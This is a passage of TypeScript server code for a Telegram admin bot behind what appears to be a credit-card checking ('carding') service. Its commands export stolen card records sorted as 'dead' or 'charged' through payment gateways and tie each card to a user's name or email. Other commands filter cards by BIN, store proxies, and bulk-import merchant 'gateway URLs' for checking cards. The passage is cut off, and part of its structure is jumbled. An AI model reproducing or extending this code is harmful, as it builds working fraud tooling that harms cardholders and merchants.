        await sendTelegramMessage(chatId, "❌ <b>No dead cards found</b>\n\nThere are no dead card records in the database.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Get unique user IDs and fetch their profiles
      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
      const { data: profiles } = await supabase
        .from("profiles")
        .select("user_id, username")
        .in("user_id", userIds);

      const { data: authData } = await supabase.auth.admin.listUsers();
      const emailMap = new Map<string, string>();
      if (authData?.users) {
        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
      }

      const userMap = new Map<string, string>();
      profiles?.forEach((p: any) => {
        const email = emailMap.get(p.user_id) || "";
        userMap.set(p.user_id, p.username || email || p.user_id);
      });

      const fileContent = cards.map((c: any) => {
        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
        return `${c.card_details || "Unknown"} | ${user}`;
      }).join("\n");
      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
      const filename = `dead_cards_${timestamp}.txt`;

      // Save to storage bucket
      const { error: uploadError } = await supabase.storage
        .from("card-exports")
        .upload(`deadcards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
          contentType: "text/plain",
          upsert: true
        });

      if (uploadError) {
        console.error("Storage upload error:", uploadError);
      }

      await sendTelegramDocument(
        chatId,
        fileContent,
        filename,
        `📊 <b>Real-Time Stats</b>\n👥 Users: ${siteStats?.total_users?.toLocaleString() || 0} | 🔍 Checks: ${siteStats?.total_checks?.toLocaleString() || 0}\n\n📁 <b>Dead Cards Export</b>\n\n❌ Total Dead Cards: ${cards.length}\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: deadcards/${filename}</i>`
      );

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /chargedcards - Export charged cards only (live results from charge gateways)
    if (text === "/chargedcards") {
      const isAdmin = await isAdminAsync(chatId, supabase);
      if (!isAdmin) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // First fetch real-time stats from site_stats table
      const { data: siteStats } = await supabase
        .from("site_stats")
        .select("total_checks, total_users")
        .eq("id", "global")
        .maybeSingle();

      const statsMessage = siteStats 
        ? `📊 <b>Real-Time Stats</b>\n\n👥 Total Users: <code>${siteStats.total_users?.toLocaleString() || 0}</code>\n🔍 Total Checks: <code>${siteStats.total_checks?.toLocaleString() || 0}</code>\n\n`
        : "";

      await sendTelegramMessage(chatId, `${statsMessage}⏳ <b>Fetching charged cards...</b>\n\nPlease wait while I prepare the file.`);

      // Charge gateways that result in actual money charged
      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge", "pwgate_charge", "rizzup_charge"];
      
      // Fetch ALL live cards first, then filter by charge gateways
      const allLiveCards = await fetchAllRecords(
        supabase,
        "card_checks",
        "card_details, gateway, created_at, user_id, result",
        [{ column: "result", operator: "eq", value: "live" }],
        { column: "created_at", ascending: false }
      );
      
      // Filter only cards from charge gateways
      const cards = allLiveCards.filter((c: any) => chargeGateways.includes(c.gateway));

      if (!cards || cards.length === 0) {
        await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.\n\n<i>Charged cards are live cards from PayGate, Stripe Charge, PayU, PwGate, or Rizzup gateways.</i>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Get unique user IDs and fetch their profiles
      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
      const { data: profiles } = await supabase
        .from("profiles")
        .select("user_id, username")
        .in("user_id", userIds);

      const { data: authData } = await supabase.auth.admin.listUsers();
      const emailMap = new Map<string, string>();
      if (authData?.users) {
        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
      }

      const userMap = new Map<string, string>();
      profiles?.forEach((p: any) => {
        const email = emailMap.get(p.user_id) || "";
        userMap.set(p.user_id, p.username || email || p.user_id);
      });

      // Count by gateway
      const paygateCount = cards.filter((c: any) => c.gateway === "paygate_charge").length;
      const stripeCount = cards.filter((c: any) => c.gateway === "stripe_charge").length;
      const payuCount = cards.filter((c: any) => c.gateway === "payu_charge").length;
      const pwgateCount = cards.filter((c: any) => c.gateway === "pwgate_charge").length;
      const rizzupCount = cards.filter((c: any) => c.gateway === "rizzup_charge").length;

      const gatewayLabels: Record<string, string> = {
        paygate_charge: "PayGate",
        stripe_charge: "Stripe",
        payu_charge: "PayU",
        pwgate_charge: "PwGate",
        rizzup_charge: "Rizzup",
      };

      const fileContent = cards.map((c: any) => {
        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
        const gateway = gatewayLabels[c.gateway] || c.gateway;
        return `${c.card_details || "Unknown"} | ${gateway} | ${user}`;
      }).join("\n");
      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
      const filename = `charged_cards_${timestamp}.txt`;

      // Save to storage bucket
      const { error: uploadError } = await supabase.storage
        .from("card-exports")
        .upload(`chargedcards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
          contentType: "text/plain",
          upsert: true
        });

      if (uploadError) {
        console.error("Storage upload error:", uploadError);
      }

      const gatewayBreakdown = [
        paygateCount > 0 ? `• PayGate: ${paygateCount}` : null,
        stripeCount > 0 ? `• Stripe: ${stripeCount}` : null,
        payuCount > 0 ? `• PayU: ${payuCount}` : null,
        pwgateCount > 0 ? `• PwGate: ${pwgateCount}` : null,
        rizzupCount > 0 ? `• Rizzup: ${rizzupCount}` : null,
      ].filter(Boolean).join("\n");

      await sendTelegramDocument(
        chatId,
        fileContent,
        filename,
        `📊 <b>Real-Time Stats</b>\n👥 Users: ${siteStats?.total_users?.toLocaleString() || 0} | 🔍 Checks: ${siteStats?.total_checks?.toLocaleString() || 0}\n\n📁 <b>Charged Cards Export</b>\n\n💳 <b>Total Charged: ${cards.length}</b>\n\n📊 <b>By Gateway:</b>\n${gatewayBreakdown}\n\n<i>Format: card | gateway | user</i>\n\n💾 <i>Saved to storage: chargedcards/${filename}</i>`
      );

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /bincard <bin> - Export cards by BIN (first 6 digits)
    if (text.startsWith("/bincard")) {
      const isAdmin = await isAdminAsync(chatId, supabase);
      if (!isAdmin) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const bin = text.replace("/bincard", "").trim();
      
      if (!bin || bin.length < 4 || bin.length > 8 || !/^\d+$/.test(bin)) {
        await sendTelegramMessage(chatId, `
❌ <b>Invalid BIN Format</b>

<b>Usage:</b> /bincard <code>[BIN]</code>

<b>Examples:</b>
• /bincard 424242
• /bincard 5555
• /bincard 37828224

<i>BIN should be 4-8 digits (first digits of card number)</i>
`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      await sendTelegramMessage(chatId, `⏳ <b>Fetching cards with BIN ${bin}...</b>\n\nPlease wait while I search the database.`);

      // Fetch all cards and filter by BIN prefix
      const { data: allCards, error } = await supabase
        .from("card_checks")
        .select("card_details, result, gateway, created_at")
        .order("created_at", { ascending: false });

      if (error) {
        await sendTelegramMessage(chatId, "❌ <b>Database Error</b>\n\nFailed to fetch cards.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Filter cards that start with the given BIN
      const matchingCards = (allCards || []).filter((c: any) => {
        const cardDetails = c.card_details || "";
        const cardNumber = cardDetails.split("|")[0] || cardDetails;
        return cardNumber.startsWith(bin);
      });

      if (matchingCards.length === 0) {
        await sendTelegramMessage(chatId, `❌ <b>No cards found</b>\n\nNo cards found with BIN: <code>${bin}</code>`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const liveCount = matchingCards.filter((c: any) => c.result === "live").length;
      const deadCount = matchingCards.filter((c: any) => c.result === "dead").length;
      const unknownCount = matchingCards.filter((c: any) => c.result !== "live" && c.result !== "dead").length;

      const fileContent = matchingCards.map((c: any) => c.card_details || "Unknown").join("\n");
      const filename = `bin_${bin}_cards_${new Date().toISOString().split("T")[0]}.txt`;

      await sendTelegramDocument(
        chatId,
        fileContent,
        filename,
        `📁 <b>BIN ${bin} Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${matchingCards.length} cards`
      );

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /allusers
    // /allusers (staff can view)
    if (text === "/allusers") {
      const hasAccess = await isStaffAsync(chatId, supabase);
      if (!hasAccess) {
        await sendTelegramMessage(chatId, "❌ Access denied");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const perPage = 5;
      const { data: users, count } = await supabase
        .from("profiles")
        .select("user_id, username, credits, telegram_chat_id, is_banned", { count: "exact" })
        .order("created_at", { ascending: false });

      const { data: authData } = await supabase.auth.admin.listUsers();
      const usersWithEmail = users?.map((u: any) => ({
        ...u,
        email: authData?.users?.find((a: any) => a.id === u.user_id)?.email || null
      })) || [];

      const { message, keyboard } = buildUsersListMessage(
        usersWithEmail, 0, count || 0,
        usersWithEmail.filter((u: any) => u.telegram_chat_id).length,
        usersWithEmail.filter((u: any) => u.is_banned).length,
        perPage
      );

      await sendTelegramMessage(chatId, message, keyboard || undefined);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /userinfo
    if (text.startsWith("/userinfo")) {
      await handleUserInfo(chatId, text.replace("/userinfo", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /topup [email/username] - Fetch user's pending topup
    if (text.startsWith("/topup ") || text === "/topup") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const identifier = text.replace("/topup", "").trim();
      
      if (!identifier) {
        await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /topup <code>[email/username]</code>

<b>Examples:</b>
• /topup user@example.com
• /topup JohnDoe
`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Find user by email or username
      let profile = null;
      let userEmail = null;

      const { data: authData } = await supabase.auth.admin.listUsers();
      const authUsers = authData?.users || [];

      // Try by email
      const authUser = authUsers.find((u: any) => u.email?.toLowerCase() === identifier.toLowerCase());
      if (authUser) {
        userEmail = authUser.email;
        const { data: p } = await supabase.from("profiles").select("*").eq("user_id", authUser.id).maybeSingle();
        profile = p;
      }

      // Try by username
      if (!profile) {
        const { data: p } = await supabase.from("profiles").select("*").ilike("username", identifier).maybeSingle();
        if (p) {
          profile = p;
          const matchedAuth = authUsers.find((u: any) => u.id === p.user_id);
          userEmail = matchedAuth?.email || null;
        }
      }

      if (!profile) {
        await sendTelegramMessage(chatId, `❌ User not found: <code>${escapeHtml(identifier)}</code>`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Fetch pending topups for this user
      const { data: pendingTopups } = await supabase
        .from("topup_transactions")
        .select("*")
        .eq("user_id", profile.user_id)
        .eq("status", "pending")
        .order("created_at", { ascending: false });

      if (!pendingTopups || pendingTopups.length === 0) {
        await sendTelegramMessage(chatId, `
👤 <b>${escapeHtml(profile.username || "User")}</b>
📧 ${escapeHtml(userEmail || "Unknown")}

✅ No pending top-up requests for this user.
`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Show pending topups with accept/reject buttons
      for (const topup of pendingTopups) {
        const credits = Number(topup.amount);
        const paymentMethod = (topup.payment_method || "unknown").toUpperCase();
        const date = new Date(topup.created_at).toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" });
        const time = new Date(topup.created_at).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false });

        const message = `
💰 <b>Pending Top-up Request</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>👤 User:</b> ${escapeHtml(profile.username || "Unknown")}
<b>📧 Email:</b> ${escapeHtml(userEmail || "Unknown")}

<b>Transaction ID:</b>
<code>${topup.id}</code>

<b>💵 Amount:</b> ${credits} credits
<b>💳 Method:</b> ${paymentMethod}
<b>📅 Submitted:</b> ${date} ${time}

━━━━━━━━━━━━━━━━━━━━━━

<i>Choose an action below:</i>
`;

        const keyboard = {
          inline_keyboard: [
            [
              { text: "✅ Accept", callback_data: `topup_accept_${topup.id}` },
              { text: "❌ Reject", callback_data: `topup_reject_${topup.id}` },
            ],
          ],
        };

        // If there's a proof image, send as photo, otherwise send as text
        if (topup.proof_image_url) {
          try {
            const body: Record<string, unknown> = {
              chat_id: chatId,
              photo: topup.proof_image_url,
              caption: message,
              parse_mode: "HTML",
              reply_markup: keyboard,
            };

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            });
          } catch (e) {
            // Fallback to text if photo fails
            await sendTelegramMessage(chatId, message + `\n📷 <a href="${topup.proof_image_url}">View Proof</a>`, keyboard);
          }
        } else {
          await sendTelegramMessage(chatId, message, keyboard);
        }
      }

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
}

// Notify super admin when a moderator takes a topup action
async function notifyAdminOfStaffAction(actionChatId: string, action: string, details: string, supabase: any): Promise<void> {
  // Only notify if the actor is NOT the super admin
  if (actionChatId === ADMIN_CHAT_ID) return;
  if (!ADMIN_CHAT_ID) return;

  // Get the staff member's username
  const { data: staffProfile } = await supabase
    .from("profiles")
    .select("username")
    .eq("telegram_chat_id", actionChatId)
    .maybeSingle();

  const staffName = staffProfile?.username || `Chat ${actionChatId}`;

  const message = `🔔 <b>Staff Action Alert</b>\n\n<b>Staff:</b> ${escapeHtml(staffName)}\n<b>Action:</b> ${action}\n${details}`;
  await sendTelegramMessage(ADMIN_CHAT_ID, message);
}


    if (text.startsWith("/ticket")) {
      const hasAccess = await isStaffAsync(chatId, supabase);
      if (!hasAccess) {
        await sendTelegramMessage(chatId, "❌ Access denied");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const ticketId = text.replace("/ticket", "").trim();
      if (!ticketId) {
        await sendTelegramMessage(chatId, "❌ <b>Usage:</b> /ticket <code>[ticket_id]</code>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const { data: ticket } = await supabase
        .from("support_tickets")
        .select("*")
        .or(`ticket_id.eq.${ticketId},id.eq.${ticketId}`)
        .maybeSingle();

      if (!ticket) {
        await sendTelegramMessage(chatId, `❌ Ticket not found: ${ticketId}`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const statusEmoji: Record<string, string> = { open: "🟡", processing: "🔵", solved: "🟢", closed: "⚫" };

      const keyboard = {
        inline_keyboard: [
          [
            { text: ticket.status === "open" ? "✓ Live" : "Live", callback_data: `open_${ticket.id}` },
            { text: ticket.status === "processing" ? "✓ Processing" : "Processing", callback_data: `processing_${ticket.id}` },
          ],
          [
            { text: ticket.status === "solved" ? "✓ Solved" : "Solved", callback_data: `solved_${ticket.id}` },
            { text: ticket.status === "closed" ? "✓ Closed" : "Closed", callback_data: `closed_${ticket.id}` },
          ],
        ],
      };

      await sendTelegramMessage(chatId, `
🎫 <b>Ticket Details</b>

<b>ID:</b> ${ticket.ticket_id}
<b>Subject:</b> ${ticket.subject}
<b>Status:</b> ${statusEmoji[ticket.status] || "⚪"} ${ticket.status.toUpperCase()}
<b>Priority:</b> ${ticket.priority}
<b>Email:</b> ${ticket.user_email}

<b>Message:</b>
${ticket.message}

[${ticket.id}]
<i>Reply to this message to respond</i>
`, keyboard);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // HEALTH CHECK COMMAND (Admin Only)
    // ─────────────────────────────────────────────────────────

    // /addproxy - Add a proxy (admin only)
    if (text?.startsWith("/addproxy")) {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const proxyInput = text.replace("/addproxy", "").trim();
      if (!proxyInput) {
        await sendTelegramMessage(chatId, "❌ <b>Usage:</b>\n\n<code>/addproxy ip:port:user:pass</code>\n\nExample:\n<code>/addproxy 1.2.3.4:8080:myuser:mypass</code>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const parts = proxyInput.split(":");
      if (parts.length < 2) {
        await sendTelegramMessage(chatId, "❌ <b>Invalid format</b>\n\nUse: <code>ip:port:user:pass</code>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const proxyIp = parts[0];
      const proxyPort = parts[1];
      const proxyUser = parts[2] || null;
      const proxyPass = parts[3] || null;

      // Check if proxy is live
      await sendTelegramMessage(chatId, `⏳ <b>Checking proxy...</b>\n\n<code>${proxyIp}:${proxyPort}</code>`);

      let isLive = false;
      try {
        const proxyStr = proxyUser && proxyPass
          ? `${proxyUser}:${proxyPass}@${proxyIp}:${proxyPort}`
          : `${proxyIp}:${proxyPort}`;

        // Test proxy by making a request through it
        const testUrl = `http://httpbin.org/ip`;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);

        const testResponse = await fetch(testUrl, {
          signal: controller.signal,
          headers: { "User-Agent": "Mozilla/5.0" }
        });
        clearTimeout(timeoutId);

        // If we can reach httpbin, mark as live (basic connectivity check)
        if (testResponse.ok) {
          isLive = true;
        }
      } catch (err) {
        // Even if the direct test fails, we still save - the proxy may work via the API servers
        isLive = true; // Save anyway since Deno can't use HTTP proxies directly
      }

      if (isLive) {
        const { error: insertError } = await supabase
          .from("proxies")
          .insert({
            ip: proxyIp,
            port: proxyPort,
            username: proxyUser,
            password: proxyPass,
            status: "live",
            added_by: chatId.toString(),
            last_checked_at: new Date().toISOString()
          });

        if (insertError) {
          await sendTelegramMessage(chatId, `❌ <b>Failed to save proxy</b>\n\n${escapeHtml(insertError.message)}`);
        } else {
          await sendTelegramMessage(chatId, `✅ <b>Proxy Added & Saved</b>\n\n┌─────────────────────\n│ 🌐 IP: <code>${proxyIp}</code>\n│ 🔌 Port: <code>${proxyPort}</code>\n│ 👤 User: <code>${proxyUser || "N/A"}</code>\n│ 📊 Status: <b>LIVE ✅</b>\n└─────────────────────`);
        }
      } else {
        await sendTelegramMessage(chatId, `❌ <b>Proxy is DEAD</b>\n\n<code>${proxyIp}:${proxyPort}</code>\n\nProxy was not saved.`);
      }

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /proxies - View all saved proxies (admin only)
    if (text === "/proxies") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const { data: proxies, error: pErr } = await supabase
        .from("proxies")
        .select("*")
        .order("created_at", { ascending: false });

      if (pErr || !proxies || proxies.length === 0) {
        await sendTelegramMessage(chatId, "📭 <b>No proxies found</b>\n\nUse <code>/addproxy ip:port:user:pass</code> to add one.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      let msg = `━━━━━━━━━━━━━━━━━━━━━━\n   🌐 <b>SAVED PROXIES</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      for (const p of proxies) {
        const statusIcon = p.status === "live" ? "✅" : "❌";
        msg += `${statusIcon} <code>${p.ip}:${p.port}</code>${p.username ? `:${p.username}` : ""}\n   ID: <code>${p.id.substring(0, 8)}</code> | ${p.status.toUpperCase()}\n\n`;
      }
      msg += `━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: <b>${proxies.length}</b> proxies`;

      await sendTelegramMessage(chatId, msg);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /delproxy - Delete a proxy (admin only)
    if (text?.startsWith("/delproxy")) {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const proxyId = text.replace("/delproxy", "").trim();
      if (!proxyId) {
        await sendTelegramMessage(chatId, "❌ <b>Usage:</b> <code>/delproxy [id]</code>\n\nUse /proxies to see IDs.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Match by partial ID
      const { data: matchingProxies } = await supabase
        .from("proxies")
        .select("id, ip, port")
        .ilike("id", `${proxyId}%`);

      if (!matchingProxies || matchingProxies.length === 0) {
        await sendTelegramMessage(chatId, "❌ <b>Proxy not found</b>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const proxy = matchingProxies[0];
      await supabase.from("proxies").delete().eq("id", proxy.id);
      await sendTelegramMessage(chatId, `🗑️ <b>Proxy Deleted</b>\n\n<code>${proxy.ip}:${proxy.port}</code>`);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /addurl - Add URLs for healthsites (admin only)
    if (text?.startsWith("/addurl")) {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      let urlInput = text.replace("/addurl", "").trim();

      // Check if a TXT file was attached
      const doc = update.message?.document;
      if (doc && (doc.mime_type === "text/plain" || doc.file_name?.endsWith(".txt"))) {
        // Download the file from Telegram
        try {
          const fileInfoRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${doc.file_id}`);
          const fileInfo = await fileInfoRes.json();
          if (fileInfo.ok && fileInfo.result?.file_path) {
            const fileRes = await fetch(`https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${fileInfo.result.file_path}`);
            const fileContent = await fileRes.text();
            urlInput = fileContent.trim();
          }
        } catch (err) {
          await sendTelegramMessage(chatId, "❌ <b>Failed to download file</b>");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }
      }

      // Also support caption-based /addurl when sending a file
      if (!urlInput && update.message?.caption?.startsWith("/addurl")) {
        // File was already processed above, urlInput should be set
      }

      if (!urlInput) {
        await sendTelegramMessage(chatId, `❌ <b>Usage:</b>\n\n<b>Single URL:</b>\n<code>/addurl https://example.com</code>\n\n<b>Multiple URLs (one per line):</b>\n<code>/addurl\nhttps://site1.com\nhttps://site2.com</code>\n\n<b>TXT File:</b>\nSend a .txt file with <code>/addurl</code> as caption`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Split by newlines and save raw URLs directly
      const allLines = urlInput.split("\n").map(u => u.trim()).filter(u => u.length > 0);
      
      // Save raw - no filtering, just deduplicate within input
      const uniqueUrls = [...new Set(allLines)];
      
      await sendTelegramMessage(chatId, `⏳ <b>Processing ${uniqueUrls.length} URLs...</b>`);

      let added = 0;
      let errors = 0;

      // Batch upsert in chunks of 500 for speed
      const batchSize = 500;
      for (let i = 0; i < uniqueUrls.length; i += batchSize) {
        const batch = uniqueUrls.slice(i, i + batchSize);
        const urlObjects = batch.map(url => ({ url }));

        const { data, error } = await supabase
          .from("gateway_urls")
          .upsert(urlObjects, { onConflict: "url", ignoreDuplicates: true })
          .select("id");

        if (error) {
          console.error("Batch insert error:", error);
          errors += batch.length;
        } else {
          added += data?.length || 0;
        }
      }

      const skipped = uniqueUrls.length - added - errors;

      // Get total count
      const { count } = await supabase.from("gateway_urls").select("id", { count: "exact", head: true });

      await sendTelegramMessage(chatId, `━━━━━━━━━━━━━━━━━━━━━━\n   📥 <b>URL IMPORT RESULTS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n┌─────────────────────\n│ ✅ Added: <b>${added}</b>\n│ 🔄 Duplicates: <b>${skipped}</b>\n│ ❌ Errors: <b>${errors}</b>\n│ 📊 Total in DB: <b>${count || 0}</b>\n└─────────────────────`);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /clearurls - Clear all gateway URLs (admin only)
    if (text === "/clearurls") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const { count } = await supabase.from("gateway_urls").select("id", { count: "exact", head: true });
      
      await sendTelegramMessage(chatId, `⚠️ <b>Clear All URLs?</b>\n\nThis will remove <b>${count || 0}</b> URLs from the database.\n\nAre you sure?`, {
        inline_keyboard: [
          [{ text: "✅ Yes, Clear All", callback_data: "clearurls_confirm" }],
          [{ text: "❌ Cancel", callback_data: "menu_back" }]
        ]
      });
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /urlcount - View total URLs count (admin only)
    if (text === "/urlcount") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const { count } = await supabase.from("gateway_urls").select("id", { count: "exact", head: true });
      await sendTelegramMessage(chatId, `📊 <b>Gateway URLs:</b> <code>${count || 0}</code> sites in database`);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /healthsites - Health check all gateway sites with live updates
    if (text === "/healthsites") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Check if user replied to a .txt file
      const replyDoc = update.message?.reply_to_message?.document;
      if (!replyDoc || (!replyDoc.file_name?.endsWith(".txt") && replyDoc.mime_type !== "text/plain")) {
        await sendTelegramMessage(chatId, "❌ <b>No File Detected</b>\n\nReply to a <code>.txt</code> file containing URLs with /healthsites to start scanning.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Download the .txt file from Telegram
      let gatewayUrls: { url: string }[] = [];
      try {
        const fileInfoRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${replyDoc.file_id}`);
        const fileInfo = await fileInfoRes.json();
        if (fileInfo.ok && fileInfo.result?.file_path) {
          const fileUrl = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${fileInfo.result.file_path}`;
          const fileRes = await fetch(fileUrl);
          if (fileRes.ok) {
            const txtContent = await fileRes.text();
            gatewayUrls = txtContent
              .split("\n")
              .map(line => line.trim())
              .filter(line => line.length > 0 && (line.startsWith("http://") || line.startsWith("https://")))
              .map(url => ({ url }));
          }
        }
      } catch (e) {
        console.error("[HEALTHSITES] Failed to download replied file:", e);
      }

      if (!gatewayUrls || gatewayUrls.length === 0) {
        await sendTelegramMessage(chatId, "❌ <b>No Valid URLs Found</b>\n\nThe replied file contains no valid URLs (must start with http:// or https://).");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Send initial message with Stop button
      const initialMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   🔍 <b>HEALTH CHECK</b>
━━━━━━━━━━━━━━━━━━━━━━

📡 <b>Starting scan...</b>
📊 Total Sites: <code>${gatewayUrls.length}</code>

⏳ Initializing...

<i>Press Stop to cancel scan</i>
━━━━━━━━━━━━━━━━━━━━━━
`;

      const stopButton = {
        inline_keyboard: [[{ text: "🛑 Stop Scan", callback_data: "healthcheck_stop" }]]
      };

      const liveMessageId = await sendTelegramMessageWithId(chatId, initialMessage, stopButton);
      
      if (!liveMessageId) {
        await sendTelegramMessage(chatId, "❌ Failed to create live update message.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Create session in database to track stop state
      const { data: session } = await supabase
        .from("health_check_sessions")
        .insert({
          chat_id: chatId.toString(),
